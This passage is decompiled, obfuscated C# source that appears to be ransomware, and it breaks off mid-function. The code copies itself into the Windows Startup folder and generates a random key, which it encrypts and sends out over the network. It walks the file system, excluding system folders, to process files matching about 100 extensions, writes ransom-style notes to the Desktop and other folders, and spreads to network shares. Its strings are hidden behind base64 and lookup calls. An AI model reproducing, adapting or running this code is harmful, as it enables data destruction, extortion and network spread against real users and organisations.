	public static bool JZTivxUTDXoXEW;

	public static bool YMRHLWBJiUVDO;

	public static bool MOHCCThblRu;

	public static string xXiTPiYVwRAzXZ;

	public static bool ypofoMoLMAIop;

	public static bool rDBZwCVKgRUaI;

	public static bool SqAckyulocFAMW;

	public static bool zqdqllncQgP;

	public static bool daZUEUUguJZ;

	public static string ggmfZNlfXyjEe;

	public static List<string> oLMoTxVfUjZardvm;

	public static List<string> UquTyEYQtihgV;

	public static List<string> BmyZaDPDavTLL;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			xNSXwTrqBx CS_0024_003C_003E8__locals0 = new xNSXwTrqBx();
			CS_0024_003C_003E8__locals0.vBwpfxmAKBAWGDJCk = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.vBwpfxmAKBAWGDJCk) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			nohHZhXZrftg.CJftdBqBmL(ufVvwFFkfqx);
		}
		catch (Exception)
		{
		}
		try
		{
			if (IJNLCLtCbZj == getString_0(107396902))
			{
				Thread thread = new Thread(OVRdorHOFze.LdUnVjTOBdhI);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (kPYyimbMmVgm == getString_0(107396902))
		{
			Thread.Sleep(int.Parse(eYvLmQuBiiyyFF));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && gMaUeFBiLvPSdQ == getString_0(107396902))
		{
			try
			{
				fewTYfOfSFD(SkTISxbocVBV(getString_0(107396897)));
			}
			catch
			{
			}
		}
		if (YxZifczjzSS == getString_0(107396902))
		{
			AfrDAfXwyYnS.tvVQDqBrzSr();
		}
		try
		{
			if (eZFubfNftlu == getString_0(107396902) && fCnnIlesTs.ooxnZVExCM())
			{
				new TLGlblqxmPq().bVjoKpVOWlMeDWpp(bool_0: false);
				fCnnIlesTs.VddVodsRpds();
			}
		}
		catch (Exception)
		{
		}
		if (CksyQDsMQxOivKBJ == getString_0(107396902) && fCnnIlesTs.ooxnZVExCM())
		{
			new TLGlblqxmPq().bVjoKpVOWlMeDWpp(bool_0: false);
			new TLGlblqxmPq().ViFGHVVBbOTpF();
		}
		if (oIGJrbczpv == getString_0(107396902))
		{
			pOowglBfaakunVRK.hgIxFXvudAN();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396760);
			string text2 = text + Path.GetFileName(fileName);
			if (DuUZzDhbMnZQ == getString_0(107396902) && fileName != text2)
			{
				Thread thread2 = new Thread(hVLAabhpMNYV);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (RJJbqlKdZXlD == getString_0(107396902) && mainModule != null && fileName != text2)
			{
				try
				{
					dCuSllWejjixrr = eQpjLympGvN(0, rXEajpcKSQopI.Count);
					File.Copy(fileName, text + rXEajpcKSQopI[dCuSllWejjixrr], overwrite: true);
					Process.Start(text + rXEajpcKSQopI[dCuSllWejjixrr]);
					fdRBVCGmbW();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (tanoogVbqvZD == getString_0(107396902) && DateTime.Now < IDYmwgLLySGGWj)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (xezRDaIykOtj == getString_0(107396902) && DateTime.Now > cgSjEEdtEoKHVgx)
			{
				fdRBVCGmbW();
			}
		}
		catch
		{
		}
		atwbVslgnr();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> pZMRrEnqoGIM = PZMRrEnqoGIM;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						sonqSVTFpSTJ(getString_0(107389645), string_0);
					};
				}
				Parallel.ForEach(pZMRrEnqoGIM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> vvJgJsMDGbodB = VvJgJsMDGbodB;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						sonqSVTFpSTJ(getString_0(107392642), string_0);
					};
				}
				Parallel.ForEach(vvJgJsMDGbodB, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source = ptHRFkgcvuKJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389668)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (SOsjYHrZSaEZ == getString_0(107396902))
				{
					string[] zBxlVVUbYpltsUa = ZBxlVVUbYpltsUa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389668)), getString_0(107389611) + string_0 + getString_0(107389634));
						};
					}
					Parallel.ForEach(zBxlVVUbYpltsUa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!ttCQNydAdpXDD().Contains(getString_0(107390369)))
				{
					MdrmbcHVOrzfshXi(ZlaqrKhgbBxdh);
				}
				else
				{
					List<string> source2 = toreclCgdJYGB;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							sonqSVTFpSTJ(SkTISxbocVBV(KCuOidVYGqyU(getString_0(107389629))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> tZZUOUERRqxMjP = TZZUOUERRqxMjP;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389604)), string_0);
					};
				}
				Parallel.ForEach(tZZUOUERRqxMjP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> dXbQUKyKVIIp = DXbQUKyKVIIp;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						sonqSVTFpSTJ(getString_0(107389555), string_0);
					};
				}
				Parallel.ForEach(dXbQUKyKVIIp, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && YMRHLWBJiUVDO)
			{
				try
				{
					Thread thread4 = new Thread(oXlRYGxGxCP.tvHbTYLzFENrYuEOt);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			sonqSVTFpSTJ(getString_0(107396755), SkTISxbocVBV(getString_0(107396774)));
			sonqSVTFpSTJ(getString_0(107396755), SkTISxbocVBV(getString_0(107397213)));
			sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107397156)), SkTISxbocVBV(getString_0(107397111)));
			sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107397156)), SkTISxbocVBV(getString_0(107396981)));
		}
		SecureString secureString = new SecureString();
		if (WZNopkcaTyAhOeK == getString_0(107396359))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			AxoZwXttJq = getString_0(107396354);
		}
		yzIAxNzzweOiCJn = hTchmIjujxwM.GMfqOAiITqajuCI(lriPjsqAmcxvJg(secureString));
		if (SqAckyulocFAMW)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), ggmfZNlfXyjEe)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), ggmfZNlfXyjEe), string.Concat(SkTISxbocVBV(getString_0(107396277)), new WebClient().DownloadString(SkTISxbocVBV(getString_0(107396284))), getString_0(107396211), SkTISxbocVBV(getString_0(107396206)), DateTime.Now, getString_0(107396211), SkTISxbocVBV(getString_0(107396709)), yzIAxNzzweOiCJn));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), ggmfZNlfXyjEe), getString_0(107396620) + yzIAxNzzweOiCJn);
				}
			}
			catch (Exception ex7)
			{
				if (ypofoMoLMAIop)
				{
					try
					{
						File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107396591) + ex7.Message + getString_0(107396211));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		eELJxAJwyCTpZ.FFSVDKzhlnoPENI(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ggiojiDitQT), QhAvpXgxGFPhG(yzIAxNzzweOiCJn), null, null, getString_0(107396574), getString_0(107396525), null);
		if (anqAMEduBjsAXr == getString_0(107396902))
		{
			try
			{
				DhnInLyZhz();
			}
			catch
			{
			}
		}
		try
		{
			QzKMgEkrVbz(new string[1] { getString_0(107396540) }, new string[100]
			{
				getString_0(107396499),
				getString_0(107396494),
				getString_0(107396489),
				getString_0(107396512),
				getString_0(107396507),
				getString_0(107396470),
				getString_0(107396465),
				getString_0(107396460),
				getString_0(107396487),
				getString_0(107396482),
				getString_0(107396477),
				getString_0(107395928),
				getString_0(107395919),
				getString_0(107395914),
				getString_0(107395937),
				getString_0(107395932),
				getString_0(107395895),
				getString_0(107395890),
				getString_0(107395885),
				getString_0(107395912),
				getString_0(107395903),
				getString_0(107395898),
				getString_0(107395861),
				getString_0(107395856),
				getString_0(107395851),
				getString_0(107395878),
				getString_0(107395873),
				getString_0(107395868),
				getString_0(107395831),
				getString_0(107395826),
				getString_0(107395821),
				getString_0(107395848),
				getString_0(107395843),
				getString_0(107395838),
				getString_0(107395797),
				getString_0(107395792),
				getString_0(107395787),
				getString_0(107395814),
				getString_0(107396465),
				getString_0(107395809),
				getString_0(107396487),
				getString_0(107395768),
				getString_0(107395763),
				getString_0(107395758),
				getString_0(107395753),
				getString_0(107395780),
				getString_0(107395775),
				getString_0(107395770),
				getString_0(107395733),
				getString_0(107395728),
				getString_0(107395723),
				getString_0(107395750),
				getString_0(107395745),
				getString_0(107395740),
				getString_0(107395703),
				getString_0(107395698),
				getString_0(107395693),
				getString_0(107395720),
				getString_0(107395711),
				getString_0(107395706),
				getString_0(107396177),
				getString_0(107396196),
				getString_0(107395809),
				getString_0(107396151),
				getString_0(107396142),
				getString_0(107396165),
				getString_0(107396156),
				getString_0(107396115),
				getString_0(107396106),
				getString_0(107396133),
				getString_0(107396124),
				getString_0(107396083),
				getString_0(107396074),
				getString_0(107396101),
				getString_0(107396096),
				getString_0(107396091),
				getString_0(107396054),
				getString_0(107396049),
				getString_0(107396044),
				getString_0(107396067),
				getString_0(107396062),
				getString_0(107396057),
				getString_0(107396020),
				getString_0(107396015),
				getString_0(107396010),
				getString_0(107396033),
				getString_0(107395992),
				getString_0(107395987),
				getString_0(107395843),
				getString_0(107395982),
				getString_0(107395977),
				getString_0(107396004),
				getString_0(107395999),
				getString_0(107395994),
				getString_0(107395953),
				getString_0(107395948),
				getString_0(107395975),
				getString_0(107395966),
				getString_0(107395961),
				getString_0(107395412)
			}, new string[0], lriPjsqAmcxvJg(secureString), getString_0(107395407));
		}
		catch (Exception ex9)
		{
			if (ypofoMoLMAIop)
			{
				try
				{
					File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107395426) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395369)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395369));
				streamWriter.WriteLine(SkTISxbocVBV(getString_0(107395368)));
				streamWriter.WriteLine(getString_0(107396211));
				streamWriter.WriteLine(SkTISxbocVBV(getString_0(107394438)));
				streamWriter.WriteLine(yzIAxNzzweOiCJn);
				if (kRzbTYvNtBEG == getString_0(107396359))
				{
					streamWriter.WriteLine(getString_0(107396211));
					streamWriter.WriteLine(SkTISxbocVBV(getString_0(107393893)) + Convert.ToString(joYcYYfKPdeY.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395369), getString_0(107393784) + yzIAxNzzweOiCJn);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in zctpFYIogjdJ)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395369)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395369), item + getString_0(107395369), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395369), getString_0(107393784) + yzIAxNzzweOiCJn);
				}
			}
			catch (Exception)
			{
			}
			if (!MOHCCThblRu && num > 10)
			{
				break;
			}
		}
		if (jHtuQgvnloEL == getString_0(107396902))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393787)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393787));
					streamWriter2.WriteLine(SkTISxbocVBV(getString_0(107393754)));
					streamWriter2.WriteLine(getString_0(107396211));
					streamWriter2.WriteLine(SkTISxbocVBV(getString_0(107393705)));
					streamWriter2.WriteLine(yzIAxNzzweOiCJn + SkTISxbocVBV(getString_0(107394128)));
					if (kRzbTYvNtBEG == getString_0(107396359))
					{
						streamWriter2.WriteLine(getString_0(107396211));
						streamWriter2.WriteLine(SkTISxbocVBV(getString_0(107394147)) + SkTISxbocVBV(getString_0(107393893)) + Convert.ToString(joYcYYfKPdeY.Count) + SkTISxbocVBV(getString_0(107394128)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393787), SkTISxbocVBV(getString_0(107394147)) + getString_0(107393784) + yzIAxNzzweOiCJn + SkTISxbocVBV(getString_0(107394128)));
				}
			}
			catch
			{
			}
		}
		if (JxmvhMInSRUBKVr == getString_0(107396902))
		{
			try
			{
				if (kRzbTYvNtBEG == getString_0(107396359))
				{
					VLhifxtGlnnIec.keKbdoVHKtVUJe(getString_0(107394086), getString_0(107394081), getString_0(107394036), string.Concat(SkTISxbocVBV(getString_0(107396277)), new WebClient().DownloadString(SkTISxbocVBV(getString_0(107396284))), getString_0(107394027), SkTISxbocVBV(getString_0(107396206)), DateTime.Now, getString_0(107396211), SkTISxbocVBV(getString_0(107394054)), Convert.ToString(joYcYYfKPdeY.Count), getString_0(107396211), SkTISxbocVBV(getString_0(107396709)), yzIAxNzzweOiCJn));
				}
				else
				{
					VLhifxtGlnnIec.keKbdoVHKtVUJe(getString_0(107394086), getString_0(107394081), getString_0(107394036), string.Concat(SkTISxbocVBV(getString_0(107396277)), new WebClient().DownloadString(SkTISxbocVBV(getString_0(107396284))), getString_0(107394027), SkTISxbocVBV(getString_0(107396206)), DateTime.Now, getString_0(107396211), SkTISxbocVBV(getString_0(107394054)), Convert.ToString(joYcYYfKPdeY.Count), getString_0(107396211), SkTISxbocVBV(getString_0(107396709)), yzIAxNzzweOiCJn));
				}
			}
			catch
			{
			}
		}
		if (mUNykcZctFGp == getString_0(107396902))
		{
			try
			{
				MetKqXjOjYreg.UeqqCPeKucdkJk(new Uri(getString_0(107393973)));
			}
			catch
			{
			}
		}
		if (jHtuQgvnloEL == getString_0(107396359))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395369)))
				{
					Process.Start(SkTISxbocVBV(getString_0(107393972)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395369));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393787)))
				{
					Process.Start(SkTISxbocVBV(getString_0(107393979)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393787));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(hPVjJeYznNYvq))
		{
			try
			{
				File.Delete(hPVjJeYznNYvq);
			}
			catch
			{
			}
		}
		if (ypofoMoLMAIop)
		{
			try
			{
				File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107393930));
			}
			catch (Exception)
			{
			}
		}
		if (FDEoXEMOMuIl == getString_0(107393949))
		{
			fdRBVCGmbW();
		}
	}

	public static void hVLAabhpMNYV()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(SkTISxbocVBV(getString_0(107393908)), SkTISxbocVBV(getString_0(107393274)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int eQpjLympGvN(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> nONyHXDbKGYoc(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107393225)) && !text.ToLower().Contains(getString_0(107393204)) && !text.ToLower().Contains(getString_0(107393223)) && !text.ToLower().Contains(getString_0(107393210)) && !text.ToLower().Contains(getString_0(107393185)) && !text.ToLower().Contains(getString_0(107393132)) && !text.ToLower().Contains(getString_0(107393151)) && !text.ToLower().Contains(getString_0(107393618)) && !text.ToLower().Contains(getString_0(107393581)) && !text.ToLower().Contains(getString_0(107393604)) && !text.ToLower().Contains(getString_0(107393555)) && !text.ToLower().Contains(getString_0(107393132)) && !text.ToLower().Contains(getString_0(107393574)) && !text.ToLower().Contains(getString_0(107393521)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107393496)) && !fileInfo.FullName.Contains(getString_0(107393511)) && !fileInfo.FullName.Contains(getString_0(107393462)) && !fileInfo.FullName.Contains(getString_0(107393477)) && !fileInfo.FullName.Contains(getString_0(107393428)) && !fileInfo.FullName.Contains(getString_0(107393443)) && !fileInfo.FullName.Contains(getString_0(107393394)) && !fileInfo.FullName.Contains(getString_0(107393409)) && !fileInfo.FullName.Contains(getString_0(107392852)) && !fileInfo.FullName.Contains(getString_0(107392863)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392818)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392837)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392788)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392803)) && !fileInfo.FullName.Contains(SkTISxbocVBV(getString_0(107392754))) && !fileInfo.FullName.Contains(getString_0(107392761)) && !fileInfo.FullName.Contains(getString_0(107392716)) && !fileInfo.FullName.EndsWith(getString_0(107395407)) && !fileInfo.FullName.EndsWith(getString_0(107392691)) && !fileInfo.FullName.EndsWith(getString_0(107392686)) && !fileInfo.FullName.EndsWith(getString_0(107392681)) && !fileInfo.FullName.EndsWith(getString_0(107392708)) && !fileInfo.FullName.Contains(getString_0(107392703)) && !fileInfo.FullName.Contains(ggiojiDitQT) && !fileInfo.FullName.Contains(xXiTPiYVwRAzXZ) && !fileInfo.FullName.Contains(ggmfZNlfXyjEe))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(bYcncUGJXgnTPoDc) * 1024.0 * 1024.0 && aYCgstfeuDqC == getString_0(107396902))
						{
							list.Add(fileInfo.FullName);
							gOdPITLyyJACl(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && aYCgstfeuDqC == getString_0(107396359))
						{
							list.Add(fileInfo.FullName);
							gOdPITLyyJACl(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string sonqSVTFpSTJ(string WGkiqOCORs = "", string degeApZqhQEP = "")
	{
		string result = getString_0(107393973);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = WGkiqOCORs,
				Arguments = degeApZqhQEP,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void fewTYfOfSFD(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392654),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string KCuOidVYGqyU(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string SkTISxbocVBV(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void DhnInLyZhz()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		UyCARjEFSIXYy.xErCUNrULlb();
		BmyZaDPDavTLL = UyCARjEFSIXYy.XccogXvurzSiAmm();
		List<TflmpwzsWktn> list = TflmpwzsWktn.NJHcTDSBNHs();
		foreach (TflmpwzsWktn item in list)
		{
			UquTyEYQtihgV.Add(item.IPAddress);
		}
		oLMoTxVfUjZardvm = BmyZaDPDavTLL.Union(UquTyEYQtihgV).ToList();
		foreach (string item2 in oLMoTxVfUjZardvm)
		{
			if ((!item2.StartsWith(getString_0(107392669)) && !item2.StartsWith(getString_0(107392632)) && !item2.StartsWith(getString_0(107392623)) && !item2.StartsWith(getString_0(107393973))) || !UyCARjEFSIXYy.pjOXfvktOBhefX(item2))
			{
				continue;
			}
			try
			{
				if (WcRXWlGGUWcMizS == getString_0(107396902))
				{
					for (int i = 0; i < UyCARjEFSIXYy.CToWTQcSnuDEqsm.Count; i++)
					{
						sonqSVTFpSTJ(getString_0(107392642), getString_0(107393109) + item2 + getString_0(107393100) + UyCARjEFSIXYy.CToWTQcSnuDEqsm[i] + getString_0(107393119) + UyCARjEFSIXYy.rtAVvpZsvLZK[i]);
					}
				}
				else
				{
					sonqSVTFpSTJ(getString_0(107392642), getString_0(107393109) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			UyCARjEFSIXYy.WcqolnoxkwtFHuAC wcqolnoxkwtFHuAC = new UyCARjEFSIXYy.WcqolnoxkwtFHuAC(UyCARjEFSIXYy.uSgqmIaufMDSx.uZsrePxyKZ, UyCARjEFSIXYy.CpZUvJNWuKgG.nzQapyKQPDVn, UyCARjEFSIXYy.QxGbSiIMnxw.IImERfVPCZ, UyCARjEFSIXYy.aYESdiVICSQlMeY.BUnsXaRcYUJBo);
			foreach (string item3 in wcqolnoxkwtFHuAC)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107393114));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (WcRXWlGGUWcMizS == getString_0(107396902))
						{
							for (int j = 0; j < UyCARjEFSIXYy.CToWTQcSnuDEqsm.Count; j++)
							{
								sonqSVTFpSTJ(getString_0(107392642), getString_0(107393001) + item4.ToString() + getString_0(107393100) + UyCARjEFSIXYy.CToWTQcSnuDEqsm[j] + getString_0(107393119) + UyCARjEFSIXYy.rtAVvpZsvLZK[j]);
							}
						}
						else
						{
							sonqSVTFpSTJ(getString_0(107392642), getString_0(107393001) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!jdESWHKNpYUqO.Contains(item4.ToString()))
					{
						jdESWHKNpYUqO.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = KCuOidVYGqyU(getString_0(107393024));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(SkTISxbocVBV(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(SkTISxbocVBV(getString_0(107392887)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(SkTISxbocVBV(getString_0(107392350)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (QGHMDSMylvnr == getString_0(107396902))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107392273), getString_0(107392296));
				File.WriteAllText(text, SkTISxbocVBV(getString_0(107392287)), Encoding.ASCII);
				sonqSVTFpSTJ(getString_0(107396755), getString_0(107391201) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391196))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391196)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391155))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391155)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391146));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!jdESWHKNpYUqO.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391093), getString_0(107396760)).Replace(getString_0(107391088), getString_0(107391093))
					.Replace(getString_0(107391111), getString_0(107393973))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					jdESWHKNpYUqO.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391093), getString_0(107396760)).Replace(getString_0(107391088), getString_0(107391093))
						.Replace(getString_0(107391111), getString_0(107393973))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391106), getString_0(107393973)) + getString_0(107391097));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static void MdrmbcHVOrzfshXi(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = SkTISxbocVBV(getString_0(107391568));
		processStartInfo.Arguments = getString_0(107391539) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool ufbOltmzDN(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
